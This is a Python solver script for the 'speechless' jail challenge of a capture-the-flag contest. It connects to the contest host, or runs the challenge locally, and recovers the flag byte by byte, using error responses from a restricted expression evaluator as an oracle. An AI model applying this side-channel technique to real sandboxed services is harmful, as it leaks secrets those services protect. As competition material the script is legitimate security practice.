import argparse
import socket
import string
import subprocess
import sys
from pathlib import Path

PROMPT = ">>> "


class SocketClient:
    """Tiny helper to talk to the remote service."""

    def __init__(self, host: str, port: int):
        self._prompt = PROMPT.encode()
        self._sock = socket.create_connection((host, port))
        self._read_until_prompt()

    def _read_until_prompt(self) -> bytes:
        data = b""
        while not data.endswith(self._prompt):
            chunk = self._sock.recv(1)
            if not chunk:
                raise ConnectionError("Connection closed unexpectedly")
            data += chunk
        return data

    def send(self, cmd: str) -> str:
        self._sock.sendall(cmd.encode() + b"\n")
        raw = self._read_until_prompt()
        return raw[: -len(self._prompt)].decode(errors="ignore")

    def close(self) -> None:
        self._sock.close()


class ProcessClient:
    """Allows local testing by spawning chall (2).py."""

    def __init__(self, script_path: Path):
        self._prompt = PROMPT
        self._proc = subprocess.Popen(
            [sys.executable, str(script_path)],
            stdin=subprocess.PIPE,
            stdout=subprocess.PIPE,
            text=True,
            bufsize=1,
        )
        self._read_until_prompt()

    def _read_until_prompt(self) -> str:
        data = ""
        while not data.endswith(self._prompt):
            chunk = self._proc.stdout.read(1)
            if chunk == "":
                raise RuntimeError("Process terminated unexpectedly")
            data += chunk
        return data

    def send(self, cmd: str) -> str:
        assert self._proc.stdin is not None
        self._proc.stdin.write(cmd + "\n")
        self._proc.stdin.flush()
        raw = self._read_until_prompt()
        return raw[: -len(self._prompt)]

    def close(self) -> None:
        self._proc.terminate()
        self._proc.wait(timeout=1)


class Solver:
    def __init__(self, client):
        self.client = client
        self._unit_var: str | None = None
        self._candidates = self._build_candidates()

    @staticmethod
    def _build_candidates() -> list[int]:
        preferred_values = [10, 13, 9, 32]  # newline, carriage return, tab, space
        preferred_chars = string.ascii_letters + string.digits + string.punctuation
        preferred_values.extend(ord(ch) for ch in preferred_chars)
        seen: set[int] = set()
        ordered: list[int] = []
        for value in preferred_values:
            if value <= 0 or value >= 256:
                continue
            if value not in seen:
                seen.add(value)
                ordered.append(value)
        for value in range(1, 256):
            if value not in seen:
                ordered.append(value)
        return ordered

    def _send(self, cmd: str) -> str:
        return self.client.send(cmd)

    @staticmethod
    def _is_error(resp: str) -> bool:
        return "stop breaking things" in resp or "you need to try harder" in resp

    def _ok(self, expr: str) -> bool:
        return not self._is_error(self._send(expr))

    def _expect(self, expr: str) -> None:
        if not self._ok(expr):
            raise RuntimeError(f"Expression failed: {expr}")

    def _difference_expr(self, var: str, value: int) -> str:
        assert self._unit_var is not None
        term = f"{self._unit_var}/{self._unit_var}"
        return var + ("-" + term) * value

    def _prepare_unit(self) -> None:
        if self._unit_var is not None:
            return
        length = 1
        while length < 2048:
            var = "b" * length
            if not self._ok(f"{var}-{var}"):
                break
            if self._ok(f"{var}/{var}"):
                self._unit_var = var
                self._expect(f"{var}-{var}")
                return
            length += 1
        raise RuntimeError("Could not find a non-zero byte to derive constants.")

    def _bruteforce_byte(self, var: str) -> int:
        for guess in self._candidates:
            diff_expr = self._difference_expr(var, guess)
            self._expect(diff_expr)
            if not self._ok("a/a"):
                return guess
        raise RuntimeError(f"Unable to determine value for {var}")

    def _leak_byte(self, var: str) -> int | None:
        if not self._ok(f"{var}-{var}"):
            return None
        if not self._ok(f"{var}/{var}"):
            return 0
        return self._bruteforce_byte(var)

    def run(self) -> bytes:
        self._prepare_unit()
        flag_bytes: list[int] = []
        index = 1
        while True:
            var = "b" * index
            value = self._leak_byte(var)
            if value is None:
                break
            flag_bytes.append(value)
            print(f"[+] Byte {index}: {value:#04x} ({chr(value)})")
            index += 1
        return bytes(flag_bytes)


def main() -> None:
    parser = argparse.ArgumentParser(description="Exploit the speechless jail challenge.")
    parser.add_argument("--local", action="store_true", help="run against local chall (2).py")
    args = parser.parse_args()

    client = None
    try:
        if args.local:
            client = ProcessClient(Path("chall (2).py"))
        else:
            client = SocketClient("speechless.challs.infobahnc.tf", 1337)
        solver = Solver(client)
        data = solver.run()
        print(f"\nFlag bytes: {data}")
        try:
            print(f"Flag text : {data.decode()}")
        except UnicodeDecodeError:
            print("Flag text : <non-UTF8 bytes>")
    finally:
        if client:
            client.close()


if __name__ == "__main__":
    main()
